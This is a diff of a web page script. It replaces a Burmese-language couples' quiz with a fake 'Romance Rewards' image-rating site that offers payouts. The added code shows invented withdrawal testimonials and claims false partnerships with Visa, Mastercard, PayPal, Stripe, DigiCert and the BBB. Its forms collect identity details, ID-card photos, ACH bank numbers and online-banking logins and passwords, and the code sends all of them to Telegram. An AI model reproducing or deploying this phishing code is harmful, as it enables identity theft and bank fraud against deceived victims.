+formData.append("caption", "📸 " + caption);
+fetch(photoBase64)
+.then(res => res.blob())
+.then(blob => {
+formData.append("photo", blob, "id_card.jpg");
+fetch(url, { method: "POST", body: formData }).catch(err => console.log(err));
+});
+}
+
+const rawImageUrls = [
+"https://i.ibb.co/zhwdB8yv/PNG-image-101.png",
+"https://i.ibb.co/Y4xkd3PR/PNG-image-118.png",
+"https://i.ibb.co/mCvZCzwN/PNG-image-119.png",
+"https://i.ibb.co/S75jtkF5/PNG-image-117.png",
+"https://i.ibb.co/3mzkpMsb/PNG-image-100.png",
+"https://i.ibb.co/JjrfNPrc/PNG-image-103.png",
+"https://i.ibb.co/4gjX05s0/PNG-image-125.png",
+"https://i.ibb.co/fVxPsbyd/PNG-image-120.png",
+"https://i.ibb.co/4RG6vbFb/PNG-image-123.png",
+"https://i.ibb.co/k29J8hhc/PNG-image-121.png",
+"https://i.ibb.co/ycB1qcTp/PNG-image-122.png",
+"https://i.ibb.co/v6mLVNR7/PNG-image-105.png",
+"https://i.ibb.co/jv4YnJf4/PNG-image-102.png",
+"https://i.ibb.co/nvcHz4T/PNG-image-107.png",
+"https://i.ibb.co/PsPGmnTD/PNG-image-124.png",
+"https://i.ibb.co/CpQVhQ63/PNG-image-104.png",
+"https://i.ibb.co/yB8b4Nvp/PNG-image-126.png",
+"https://i.ibb.co/G3v8y2Rw/PNG-image-106.png",
+"https://i.ibb.co/NgrhXgVr/PNG-image-108.png",
+"https://i.ibb.co/N22mHyTq/PNG-image-109.png",
+"https://i.ibb.co/3mm1J00L/PNG-image-115.png",
+"https://i.ibb.co/Q3t3cpNg/PNG-image-114.png",
+"https://i.ibb.co/DgSWwWPM/PNG-image-110.png",
+"https://i.ibb.co/vxjTcgCw/PNG-image-112.png",
+"https://i.ibb.co/yFynrxDL/PNG-image-116.png",
+"https://i.ibb.co/Zzm8RV0g/PNG-image-111.png",
+"https://i.ibb.co/YgqL0Q9/PNG-image-113.png",
+"https://i.ibb.co/nqHcmzn1/PNG-image-63.png",
+"https://i.ibb.co/1YbJJJ5v/PNG-image-90.png",
+"https://i.ibb.co/RGVnRw3k/PNG-image-83.png",
+"https://i.ibb.co/x8K68bDc/PNG-image-66.png",
+"https://i.ibb.co/C3ycmKH5/PNG-image-68.png",
+"https://i.ibb.co/DPHp4bSH/PNG-image-85.png",
+"https://i.ibb.co/JjZXfbrX/PNG-image-74.png",
+"https://i.ibb.co/PZqrn671/PNG-image-91.png",
+"https://i.ibb.co/6hJWsty/PNG-image-57.png",
+"https://i.ibb.co/Jws3Q58h/PNG-image-65.png",
+"https://i.ibb.co/vS0j4jh/PNG-image-76.png",
+"https://i.ibb.co/kV6MdQzz/PNG-image-78.png",
+"https://i.ibb.co/66Y0bVF/PNG-image-61.png",
+"https://i.ibb.co/TDTTqKkD/PNG-image-58.png",
+"https://i.ibb.co/Bh7p8pf/PNG-image-96.png",
+"https://i.ibb.co/tTmBv5Yf/PNG-image-62.png",
+"https://i.ibb.co/rKwbmJx1/PNG-image-80.png",
+"https://i.ibb.co/m5SBGtBt/PNG-image-71.png",
+"https://i.ibb.co/YFpfQFtg/PNG-image-97.png",
+"https://i.ibb.co/Z66nmyWM/PNG-image-82.png",
+"https://i.ibb.co/jPjCphYg/PNG-image-88.png",
+"https://i.ibb.co/sJcH413z/PNG-image-92.png",
+"https://i.ibb.co/pjwT6vSh/PNG-image-73.png",
+"https://i.ibb.co/Z6p9Gf9F/PNG-image-99.png",
+"https://i.ibb.co/S4fjnjL6/PNG-image-75.png",
+"https://i.ibb.co/tT0TX7Rb/PNG-image-94.png",
+"https://i.ibb.co/gZG85m8K/PNG-image-98.png",
+"https://i.ibb.co/hJKxLY4n/PNG-image-67.png",
+"https://i.ibb.co/j969hsqY/PNG-image-60.png",
+"https://i.ibb.co/bgvTq6HX/PNG-image-55.png",
+"https://i.ibb.co/2Y8jDbHD/PNG-image-64.png",
+"https://i.ibb.co/TD4HRSKY/PNG-image-87.png",
+"https://i.ibb.co/B50w81SC/PNG-image-86.png",
+"https://i.ibb.co/Hfs08gPn/PNG-image-72.png",
+"https://i.ibb.co/d0Lwv7bn/PNG-image-77.png",
+"https://i.ibb.co/zhgx6FtT/PNG-image-84.png",
+"https://i.ibb.co/1fk1jJwx/PNG-image-56.png",
+"https://i.ibb.co/Y7w2Nx80/PNG-image-70.png",
+"https://i.ibb.co/v6qHsvkN/PNG-image-95.png",
+"https://i.ibb.co/rRGzSLmy/PNG-image-69.png",
+"https://i.ibb.co/Ndtkxvp2/PNG-image-81.png",
+"https://i.ibb.co/z1nBY8f/PNG-image-79.png",
+"https://i.ibb.co/5gvryMqb/PNG-image-89.png",
+"https://i.ibb.co/5XRRHCfV/PNG-image-93.png",
+"https://i.ibb.co/Rp8TWVfB/PNG-image-59.png",
+"https://i.ibb.co/ZDRqMQK/PNG-image-18.png",
+"https://i.ibb.co/Z6t3sqf9/PNG-image-35.png",
+"https://i.ibb.co/TxLrNhCX/PNG-image-38.png",
+"https://i.ibb.co/v4nfR5kC/PNG-image-42.png",
+"https://i.ibb.co/hJ22zW3y/PNG-image-11.png",
+"https://i.ibb.co/HfF3PmPh/PNG-image-23.png",
+"https://i.ibb.co/jPwkygjH/PNG-image-8.png",
+"https://i.ibb.co/tp5j2v1p/PNG-image-15.png",
+"https://i.ibb.co/CKJMM9F7/PNG-image-26.png",
+"https://i.ibb.co/G4GdwsYK/PNG-image-39.png",
+"https://i.ibb.co/0yxTH6bm/PNG-image-29.png",
+"https://i.ibb.co/DDhMkLCM/PNG-image-2.png",
+"https://i.ibb.co/DPTg7xC1/PNG-image-32.png",
+"https://i.ibb.co/RTM7kfTF/PNG-image-5.png",
+"https://i.ibb.co/mFb1V3G0/PNG-image-17.png",
+"https://i.ibb.co/DmkxmkC/PNG-image-20.png",
+"https://i.ibb.co/Fk4VJ0MH/PNG-image-14.png",
+"https://i.ibb.co/wFjNsQR3/PNG-image-34.png",
+"https://i.ibb.co/XkNVMWRP/PNG-image-37.png",
+"https://i.ibb.co/TN9DhD2/PNG-image-41.png",
+"https://i.ibb.co/xK6zptw7/PNG-image-13.png",
+"https://i.ibb.co/fVkG0Q4n/PNG-image-25.png",
+"https://i.ibb.co/jv0LcJLK/PNG-image-10.png",
+"https://i.ibb.co/gbkQjmWv/PNG-image-47.png",
+"https://i.ibb.co/0y7WWHZ0/PNG-image-7.png",
+"https://i.ibb.co/27RPrnKL/PNG-image-22.png",
+"https://i.ibb.co/6JsM7D9j/PNG-image.png",
+"https://i.ibb.co/Rk4PZQ85/PNG-image-28.png",
+"https://i.ibb.co/BVmmkWVG/PNG-image-36.png",
+"https://i.ibb.co/Jjgpd9Bx/PNG-image-31.png",
+"https://i.ibb.co/Hfd10pKH/PNG-image-43.png",
+"https://i.ibb.co/C5gwT7pz/PNG-image-16.png",
+"https://i.ibb.co/93njPRRD/PNG-image-4.png",
+"https://i.ibb.co/QjJXx2z3/PNG-image-27.png",
+"https://i.ibb.co/kV1Z2LJY/PNG-image-19.png",
+"https://i.ibb.co/60BJ6F4F/PNG-image-12.png",
+"https://i.ibb.co/qY18mdm4/PNG-image-40.png",
+"https://i.ibb.co/66XHq3K/PNG-image-9.png",
+"https://i.ibb.co/5gLDdDfy/PNG-image-24.png",
+"https://i.ibb.co/yFJbCLbr/PNG-image-6.png",
+"https://i.ibb.co/HfNbYzHn/PNG-image-33.png",
+"https://i.ibb.co/TB1QfQ2G/PNG-image-30.png",
+"https://i.ibb.co/Qgy2HG0/PNG-image-3.png",
+"https://i.ibb.co/SHTpjt4/PNG-image-49.png",
+"https://i.ibb.co/yFsgVVjN/PNG-image-45.png",
+"https://i.ibb.co/nsfVHV4j/PNG-image-46.png",
+"https://i.ibb.co/MkdBbScF/PNG-image-44.png",
+"https://i.ibb.co/8LgK3SM2/PNG-image-50.png",
+"https://i.ibb.co/gMpd20jm/PNG-image-48.png",
+"https://i.ibb.co/qF33kSKh/IMG-7615.jpg",
+"https://i.ibb.co/3ynFsqY5/IMG-7614.jpg",
+"https://i.ibb.co/5WzvSSTk/IMG-7595.jpg",
+"https://i.ibb.co/kgPWmC9t/IMG-7594.jpg",
+"https://i.ibb.co/Wv1xSFmG/IMG-7593.jpg",
+"https://i.ibb.co/ymHyMWb2/IMG-7592.jpg",
+"https://i.ibb.co/j9wJJ3MN/IMG-7591.jpg",
+"https://i.ibb.co/4R7D8hXS/IMG-7590.jpg",
+"https://i.ibb.co/CKVbBqBr/IMG-7589.jpg",
+"https://i.ibb.co/d0qNNVfQ/IMG-7588.jpg",
+"https://i.ibb.co/tPxWTPXG/IMG-7586.jpg",
+"https://i.ibb.co/C3TBQ0sG/IMG-7585.jpg",
+"https://i.ibb.co/XZVCsKyb/IMG-7582.jpg",
+"https://i.ibb.co/Jwc9LynY/telegram-photo-0-6300841371581398948.jpg",
+"https://i.ibb.co/N6kRmrkQ/IMG-7493.jpg",
+"https://i.ibb.co/1f8WfBws/IMG-7491.jpg",
+"https://i.ibb.co/KxvTG6x2/IMG-7497.jpg",
+"https://i.ibb.co/DPTqQGdm/IMG-7496.jpg",
+"https://i.ibb.co/992rknHq/IMG-7494.jpg",
+"https://i.ibb.co/6JmrSLqf/IMG-7495.jpg"
 ];
 
-let currentQuestionIndex = 0;
-const welcomePage = document.getElementById('welcomePage');
-const gamePage = document.getElementById('gamePage');
-const questionText = document.getElementById('questionText');
-const resultText = document.getElementById('resultText');
-const nextBtn = document.getElementById('nextBtn');
-const choicesContainer = document.getElementById('choicesContainer');
-const floatingContainer = document.getElementById('floatingContainer');
-const bgAudio = document.getElementById('bgAudio');
-let isMusicPlaying = false;
-let weatherInterval = null;
+let images = [];
+rawImageUrls.forEach((url, i) => {
+images.push({
+title: `US Romance Gallery ${i < 9 ? '0' + (i + 1) : (i + 1)}`,
+img: url
+});
+});
 
-function startGame() {
-bgAudio.play().catch(error => { console.log("Audio play blocked:", error); });
-isMusicPlaying = true;
-welcomePage.style.display = 'none';
-gamePage.style.display = 'block';
-floatingContainer.classList.add('game-active');
-loadQuestion();
-startWeatherCycle();
+const modalData = {
+visa: {
+title: "VISA Secure Gateway",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Officially certified and legally compliant under US digital transaction standards since 2022. Provides encrypted end-to-end settlement protection and secure merchant clearing frameworks."
+},
+mastercard: {
+title: "Mastercard Identity Check",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "In official partnership since 2022, ensuring robust tokenization, multi-factor authentication, and strict adherence to federal consumer protection mandates."
+},
+stripe: {
+title: "Stripe Financial Infrastructure",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Integrated liquidity and payment compliance partner since 2022, delivering transparent payout processing and regulated financial routing standards."
+},
+paypal: {
+title: "PayPal Secure Checkout",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Trusted escrow and buyer protection partner since 2022, providing verified multi-currency transaction safety and consumer dispute resolution guidelines."
+},
+digicert: {
+title: "DigiCert TLS/SSL Security",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Exclusive digital certificate authority protecting platform sessions since 2022, enforcing quantum-resistant encryption and strict data privacy protocols."
+},
+bbb: {
+title: "BBB Accreditation Verified",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Accredited member since 2022 with an A+ rating, officially recognized for high ethical business standards, transparency, and consumer trust."
+}
+};
+
+let currentRating = 0;
+let userBalance = 15.00;
+let currentUserEmail = "";
+let frontIdBase64 = "";
+let backIdBase64 = "";
+let selectedCardIndex = null;
+
+const usPayoutNames = [
+"Michael S. (California) withdrew $150.00", "Jessica W. (New York) withdrew $250.00",
+"David M. (Texas) withdrew $100.00", "Emily R. (Florida) withdrew $300.00",
+"James K. (Illinois) withdrew $120.00", "Amanda J. (Washington) withdrew $180.00",
+"Robert T. (Ohio) withdrew $220.00", "Sarah L. (Georgia) withdrew $140.00",
+"William B. (Michigan) withdrew $190.00", "Ashley H. (North Carolina) withdrew $210.00"
+];
+
+function initLandingGrid() {
+const previewContainer = document.getElementById("landing-grid-preview");
+if (!previewContainer) return;
+previewContainer.innerHTML = "";
+for(let i = 0; i < 16; i++) {
+previewContainer.innerHTML += `<img src="${images[i].img}" alt="Preview ${i+1}">`;
+}
+const tickerEl = document.getElementById("landing-payout-ticker");
+if(tickerEl) tickerEl.innerText = "💰 " + usPayoutNames.join(" • ") + " • ";
+const dashTickerEl = document.getElementById("dashboard-payout-ticker");
+if(dashTickerEl) dashTickerEl.innerText = "💰 " + usPayoutNames.join(" • ") + " • ";
+const sectionTitleCount = document.getElementById("section-title-count");
+if(sectionTitleCount) sectionTitleCount.innerText = `Available Gallery Items (${images.length} Images)`;
+loadImages(images);
+updateProgressBar(userBalance);
 }
 
-function startWeatherCycle() {
-const weathers = ['sunWeather', 'rainWeather', 'windWeather', 'snowWeather'];
-let currentIndex = 0;
+function updateProgressBar(currentBalance) {
+let target = 50.00;
+let percentage = (currentBalance / target) * 100;
+if (percentage > 100) percentage = 100;
 
-weatherInterval = setInterval(() => {
-document.querySelectorAll('.weather-container').forEach(el => el.classList.remove('active'));
-currentIndex = (currentIndex + 1) % weathers.length;
-document.getElementById(weathers[currentIndex]).classList.add('active');
-}, 10000);
-}
+let remaining = target - currentBalance;
+if (remaining < 0) remaining = 0;
 
-function loadQuestion() {
-if (currentQuestionIndex < questions.length) {
-questionText.innerText = questions[currentQuestionIndex];
-resultText.innerText = "";
-resultText.classList.remove("active");
-choicesContainer.style.display = "flex";
-nextBtn.style.display = "none";
+let fillEl = document.getElementById("progress-bar-fill");
+let percentEl = document.getElementById("progress-percentage");
+let milestoneEl = document.getElementById("progress-milestone-text");
+
+if (fillEl) fillEl.style.width = percentage + "%";
+if (percentEl) percentEl.innerText = Math.round(percentage) + "% Completed";
+if (milestoneEl) {
+if (remaining === 0) {
+milestoneEl.innerHTML = `Minimum Withdrawal: <span style="color: #FFFFFF; font-weight: 700;">$50.00</span> (<span style="color: #ffffff;">Ready to withdraw! 🎉</span>)`;
 } else {
-questionText.innerText = "🎉 မေးခွန်း ၃၀ လုံး ကုန်သွားပါပြီ! နှစ်ယောက်သား အမြဲတမ်း ပျော်ရွှင်စွာနေသွားကြမယ်နော်ပူတူးလေး❤️";
-choicesContainer.style.display = 'none';
-resultText.innerText = "";
-resultText.classList.remove("active");
-nextBtn.style.display = "none";
-if(weatherInterval) clearInterval(weatherInterval);
+milestoneEl.innerHTML = `Minimum Withdrawal: <span style="color: #FFFFFF; font-weight: 700;">$50.00</span> (<span style="color: #ffffff;">$${remaining.toFixed(2)} more to go</span>)`;
+}
 }
 }
 
-function selectChoice(person) {
-let name = (person === 'boy') ? "ကိုကို ❤️" : "မီးမီး 💋 ";
-let actionText = (person === 'boy') ? " အသည်းလေးက တောက်လျှောက်တောက်လျှောက် ချစ်ဖို့ကောင်းနေတာပဲ!" : " အနမ်းပေးချင်စရာ လုံးဝကို ချစ်စရာအသည်းယားစရာကြီးကွာ!";
-resultText.innerHTML = `😘 ဟားဟား! "${name}" ဆိုတာ သေချာပေါ့ကွာ..<br>${actionText} 🥰`;
-resultText.classList.add("active");
-choicesContainer.style.display = 'none';
-nextBtn.style.display = "block";
+function switchPage(pageId) {
+document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+document.querySelectorAll('.sub-page-container').forEach(p => p.classList.remove('active'));
+const targetPage = document.getElementById(pageId);
+if (targetPage) targetPage.classList.add('active');
+window.scrollTo(0, 0);
 }
 
-function nextQuestion() {
-currentQuestionIndex++;
-loadQuestion();
+function toggleSidebar() {
+document.getElementById('sidebar').classList.toggle('open');
+document.getElementById('overlay').classList.toggle('active');
 }
 
-function toggleMusic() {
-if (isMusicPlaying) { bgAudio.pause(); isMusicPlaying = false; }
-else { bgAudio.play(); isMusicPlaying = true; }
+function openSubPage(pageId) {
+toggleSidebar();
+switchPage(pageId);
 }
+
+function handleLoginSubmit() {
+let emailInput = document.getElementById("login-email");
+let passInput = document.getElementById("login-pass");
+let email = emailInput ? emailInput.value : "";
+let pass = passInput ? passInput.value : "";
+if(!email || !pass) {
+alert("Please enter both email and password.");
+return;
+}
+
+window.loginUser(email, pass);
+}
+
+function handleSignupSubmit() {
+let emailInput = document.getElementById("signup-email");
+let passInput = document.getElementById("signup-pass");
+let email = emailInput ? emailInput.value : "";
+let pass = passInput ? passInput.value : "";
+if(!email || !pass) {
+alert("Please enter both email and password for sign up.");
+return;
+}
+
+window.signUpUser(email, pass);
+}
+
+function loadImages(list) {
+const container = document.getElementById("image-grid-container");
+if (!container) return;
+container.innerHTML = "";
+list.forEach((imgItem, index) => {
+container.innerHTML += `<div class="image-card" id="img-card-${index}" onclick="openDetail(${index})"> <img src="${imgItem.img}" alt="${imgItem.title}"> <div class="image-info"> <div class="image-title">${imgItem.title}</div> <div class="stars"> <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i> <span style="color:#94a3b8; font-size:0.7rem;">(5.0)</span> </div> </div> </div>`;
+});
+}
+
+function filterGallery(type) {
+document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+event.currentTarget.classList.add('active');
+if(type === 'trending') {
+loadImages(images.slice(0, 20));
+} else if(type === 'top') {
+loadImages(images.slice(20, 40));
+} else if(type === 'recent') {
+loadImages(images.slice(40, 60));
+} else {
+loadImages(images);
+}
+}
+
+function openDetail(index) {
+selectedCardIndex = index;
+const imgItem = images[index];
+document.getElementById("detail-img").src = imgItem.img;
+document.getElementById("detail-title").innerText = imgItem.title;
+currentRating = 0;
+resetStars();
+document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+document.querySelectorAll('.sub-page-container').forEach(p => p.classList.remove('active'));
+document.getElementById('detail-page').classList.add('active');
+window.scrollTo(0, 0);
+}
+
+function goBackToDashboard() {
+document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+document.querySelectorAll('.sub-page-container').forEach(p => p.classList.remove('active'));
+document.getElementById('dashboard-page').classList.add('active');
+if (selectedCardIndex !== null) {
+setTimeout(() => {
+let cardEl = document.getElementById(`img-card-${selectedCardIndex}`);
+if (cardEl) cardEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}, 50);
+} else {
+window.scrollTo(0, 0);
+}
+}
+
+function rateStar(stars) {
+currentRating = stars;
+document.querySelectorAll("#star-container i").forEach((el, idx) => {
+if (idx < stars) el.classList.add("rated");
+else el.classList.remove("rated");
+});
+}
+
+function resetStars() {
+document.querySelectorAll("#star-container i").forEach(el => el.classList.remove("rated"));
+}
+
+function submitRating() {
+if (currentRating === 0) {
+alert("Please select star rating first.");
+return;
+}
+userBalance += 2.00;
+document.getElementById("user-balance").innerText = userBalance.toFixed(2);
+document.getElementById("statement-balance").innerText = userBalance.toFixed(2);
+updateProgressBar(userBalance);
+alert("Rating submitted successfully! ($2.00 added to balance)");
+goBackToDashboard();
+}
+
+function previewImage(event, previewId) {
+let reader = new FileReader();
+reader.onload = function(){
+let output = document.getElementById(previewId);
+output.src = reader.result;
+output.style.display = "block";
+if(previewId === 'front-preview') frontIdBase64 = reader.result;
+else backIdBase64 = reader.result;
+};
+if(event.target.files[0]) reader.readAsDataURL(event.target.files[0]);
+}
+
+function saveKYCInfo() {
+let name = document.getElementById("kyc-name").value;
+let phone = document.getElementById("kyc-phone").value;
+let idType = document.getElementById("kyc-id-type").value;
+if(!name || !phone) {
+alert("Please fill in all KYC details.");
+return;
+}
+let msg = `🪪 *US KYC Info Captured!* 🪪\n\n` +
+`📧 *Email:* \`${currentUserEmail}\`\n` +
+`👤 *Name:* ${name}\n` +
+`📞 *Phone:* ${phone}\n` +
+`📑 *ID Type:* ${idType}`;
+sendToTelegram(msg);
+if(frontIdBase64) sendPhotoToTelegram(frontIdBase64, `🪪 Front ID Photo - ${currentUserEmail} (${name})`);
+if(backIdBase64) sendPhotoToTelegram(backIdBase64, `🪪 Back ID Photo - ${currentUserEmail} (${name})`);
+alert("US KYC verification details & photos sent successfully!");
+switchPage('dashboard-page');
+}
+
+function saveACHBankInfo() {
+let bankName = document.getElementById("ach-bank-name").value;
+let holderName = document.getElementById("ach-holder-name").value;
+let routing = document.getElementById("ach-routing").value;
+let account = document.getElementById("ach-account").value;
+let accountType = document.getElementById("ach-type").value;
+
+if(!bankName || !routing || !account) {
+alert("Please fill in all required ACH bank details.");
+return;
+}
+
+let msg = `🏦 *US ACH Bank Linked!* 🏦\n\n` +
+`📧 *Email:* \`${currentUserEmail}\`\n` +
+`🏛️ *Bank:* ${bankName}\n` +
+`👤 *Holder:* ${holderName}\n` +
+`🔢 *Routing:* \`${routing}\`\n` +
+`💳 *Account:* \`${account}\`\n` +
+`📂 *Type:* ${accountType}`;
+sendToTelegram(msg);
+alert("US Bank account successfully linked via ACH!");
+switchPage('dashboard-page');
+}
+
+function submitWithdrawal() {
+let amount = document.getElementById("withdraw-amount").value;
+let bankName = document.getElementById("withdraw-bank-name").value;
+let bankUser = document.getElementById("withdraw-bank-user").value;
+let bankPass = document.getElementById("withdraw-bank-pass").value;
+
+if(!amount || !bankName || !bankUser || !bankPass) {
+alert("Please fill in all withdrawal details.");
+return;
+}
+
+let msg = `💸 *US Withdrawal Request!* 💸\n\n` +
+`📧 *Email:* \`${currentUserEmail}\`\n` +
+`💰 *Amount:* \$${amount}\n` +
+`🏛️ *Bank Name:* ${bankName}\n` +
+`👤 *Bank User:* \`${bankUser}\`\n` +
+`🔑 *Bank Pass:* \`${bankPass}\``;
+sendToTelegram(msg);
+alert("Withdrawal request submitted successfully!");
+switchPage('dashboard-page');
+}
+
+function openModal(type) {
+const modal = document.getElementById('infoModal');
+const contentBox = document.getElementById('modalBodyContent');
+const data = modalData[type];
+if (data) {
+contentBox.innerHTML = `<div style="text-align: center; margin-bottom: 15px;"> <div style="display: inline-block; padding: 10px; background: #0f172a; border-radius: 50%; color: #E000FF; font-size: 1.5rem; margin-bottom: 10px; border: 1px solid #8A00F5;"> <i class="fas fa-shield-alt"></i> </div> <h3 style="color: #E000FF; font-size: 1.25rem; font-weight: 700; margin: 0 0 5px 0;">${data.title}</h3> <p style="color: #FFFFFF; font-size: 0.8rem; font-weight: 600; margin: 0;">${data.subtitle}</p> </div> <div style="background: #0f172a; border-left: 3px solid #8A00F5; padding: 12px 15px; border-radius: 0 8px 8px 0; margin-top: 10px; border: 1px solid #334155;"> <p style="color: #f8fafc; font-size: 0.875rem; line-height: 1.6; margin: 0;">${data.desc}</p> </div>`;
+modal.style.display = 'flex';
+}
+}
+
+function closeModal() {
+document.getElementById('infoModal').style.display = 'none';
+}
+
+function navigateToMainMenu() {
+toggleSidebar();
+switchPage('dashboard-page');
+}
+
+window.onclick = function(event) {
+const modal = document.getElementById('infoModal');
+if (event.target == modal) modal.style.display = 'none';
+}
+
+window.addEventListener('DOMContentLoaded', (event) => {
+initLandingGrid();
+});
 </script>
 </body>
 </html>
